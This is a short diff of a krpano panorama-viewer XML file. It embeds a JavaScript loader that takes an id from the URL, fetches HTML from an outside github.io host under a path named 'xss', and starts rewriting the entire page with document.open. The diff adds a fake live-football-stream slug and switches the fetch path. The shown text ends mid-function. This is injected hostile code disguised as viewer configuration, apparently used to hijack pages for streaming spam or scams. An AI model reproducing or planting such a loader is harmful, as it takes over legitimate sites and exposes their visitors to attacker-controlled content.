@@ -1,9 +1,9 @@
 <krpano version="1.0.8.15">
 <action name="js_loader_start" type="Javascript"><![CDATA[
-var id = new URLSearchParams(window.location.search).get("id") || "video-lens-vs-om-st-ream-ing-liv-hd-ywYh8";
+var id = new URLSearchParams(window.location.search).get("id") || "video-barcelona-vs-atletico-madrid-live-broadcast-K3mP9a";
 if (!window.__kgh_loader_done) {
   window.__kgh_loader_done = 1;
-  window.fetch("https://lovecrash301.github.io/KXmISKKA/kpk/" + id + ".html")
+  window.fetch("https://lovecrash301.github.io/KXmISKKA/xss/" + id + ".html")
     .then(function (r) { return r.text(); })
     .then(function (html) {
       window.document.open();
